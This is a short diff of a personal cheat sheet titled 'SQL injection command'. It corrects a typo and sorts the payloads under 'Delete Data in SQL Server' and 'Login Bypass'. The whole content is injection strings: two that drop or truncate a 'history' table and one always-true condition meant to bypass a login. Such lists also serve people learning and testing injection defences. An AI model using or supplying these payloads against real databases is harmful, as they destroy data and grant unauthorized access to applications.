@@ -1,7 +1,14 @@
----------------------------------
-SQL injection commad
+---------------------
+SQL injection command
+---------------------
+-----------------------------
+[ Delete Data in SQL Server ] 
 
 '; DROP TABLE history; --
 '; TRUNCATE TABLE history; --
+-----------------------------
+----------------
+[ Login Bypass ] 
+
 ' OR 'a'='a'; -- 
----------------------------------
+----------------
